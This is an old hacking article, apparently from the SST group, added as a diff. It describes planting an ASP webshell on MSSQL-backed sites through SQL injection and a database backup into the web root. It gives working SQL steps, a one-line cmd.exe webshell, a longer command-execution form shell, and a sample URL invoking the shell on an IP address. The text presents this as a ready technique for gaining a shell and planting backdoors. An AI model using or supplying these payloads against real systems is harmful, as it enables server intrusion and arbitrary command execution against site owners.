@@ -1,0 +1,72 @@
+[Backup a shell]
+From	: SST (www.0x557.org)
+Author	: Swan (Swan[at]0x557[dot]org)
+
+
+  This article is about how to get a webshell when SQL Injecting under MSSQL database.  The method seems work well since the day I found her(July 2003). You don't need the sa privilege, just a dbowner is Okay.
+  Open your Query Analyzer, following steps will generate a strange but useable webshell(suppose your web root is g:\wwwtest and the database model is intact)
+
+use model;
+create table cmd (str image);
+insert into cmd(str) values ('<%=server.createobject("wscript.shell").exec("cmd.exe /c "&request("c")).stdout.readall%>');
+backup database model to disk='g:\wwwtest\l.asp';
+
+  Click run and the database model has been backuped into the web publish directory. Download? No, visit this file, you have got the shell...
+
+http://202.119.9.42/l.asp?c=dir
+
+  Here is the explanation: the ASP(VB) interpreter will ignore the characters those not between "<%" and "%>", so naming the backup file as .asp and visiting it won't cause a 500 error if it contains no "<%" nor "%>". By default, the database stores its data in a "loose" way(e.g. the stored string "Time" will be seen in the backup file as the type of "T i m e"), so the probability that the backup file contains "<%" or "%>" is low. These are two preconditions.
+  But how we could make it a webshell? The storage mode of image or bin type is different, the data in the backup file appear exactly the format of what we have wrote, that is, those what we insert into the table/database with the type of image will NOT be output in the "loose" way in the backup file, but the original format. Once we create a table with a image segment and insert some evil codes, we could backup a shell!
+
+  Er, here also are some cons:
+
+1)  the output directort should be the physical web directory. Usually, we can only guess. For virtual host, perhaps we could reveal the path in other sites and other ways.
+2)  the database visitor should have the backup privilege. Some abnormal webmaster gave only select and insert privilege, once you meet such webmaster, abandon this way.
+
+  Here are the pros:
+1)  it will give you the webshell once your have the backup privilege. A dbowner have that!
+2)  it gives a new method of putting backdoor. Suppose your database is ACCESS, and you name it .asp to prevent from downloading. It COULD be a webshell ;)
+3)  ...
+
+  Oh, I nearly forget the most important thing: data which are in different insert phrases are NOT tangent, that means if your webshell codes are too long, you should do as the follow:
+
+========= CUT ME HERE ======================================================
+use model
+create table cmd (str image);
+insert into cmd(str) values ('<% Dim oScript %>');
+insert into cmd(str) values ('<% Dim oScriptNet%>');
+insert into cmd(str) values ('<% Dim oFileSys, oFile%>');
+insert into cmd(str) values ('<% Dim szCMD, szTempFile%>');
+insert into cmd(str) values ('<% Set oScript = Server.CreateObject("WSCRIPT.SHELL")%>');
+insert into cmd(str) values ('<% Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")%>');
+insert into cmd(str) values ('<% Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")%>');
+insert into cmd(str) values ('<% szCMD = Request.Form(".CMD")%>');
+insert into cmd(str) values ('<% If (szCMD <> "") Then%>');
+insert into cmd(str) values ('<% szTempFile = "C:\" & oFileSys.GetTempName()%>');
+insert into cmd(str) values ('<% Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)%>');
+insert into cmd(str) values ('<% Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)%>');
+insert into cmd(str) values ('<% End If %>');
+insert into cmd(str) values ('<HTML><BODY><FORM action="<%= Request.ServerVariables("URL") %>" method="POST">');
+insert into cmd(str) values ('<input type=text name=".CMD" size=45 value="<%= szCMD %>"><input type=submit value="Run"></FORM><PRE>');
+insert into cmd(str) values ('<% If (IsObject(oFile)) Then%>');
+insert into cmd(str) values ('<% On Error Resume Next%>');
+insert into cmd(str) values ('<% Response.Write Server.HTMLEncode(oFile.ReadAll)%>');
+insert into cmd(str) values ('<% oFile.Close%>');
+insert into cmd(str) values ('<% Call oFileSys.DeleteFile(szTempFile, True)%>');
+insert into cmd(str) values ('<% End If%>');
+insert into cmd(str) values ('</BODY></HTML>');
+backup database model to disk='c:\l.asp';
+========= CUT ME HERE ======================================================
+
+To those who did not successfully get the shell:
+  Make your testing database(e.g. model) INTACT.
+
+To those who surf on the web:
+  declare @a sysname; select @a=db_name()
+
+To those who thought it is too simple:
+  Try the way backup log or think about how to access all file in a similar way ;)
+
+Greets:
+  All SST Members.
+  Yang Shuo, my girl friend.
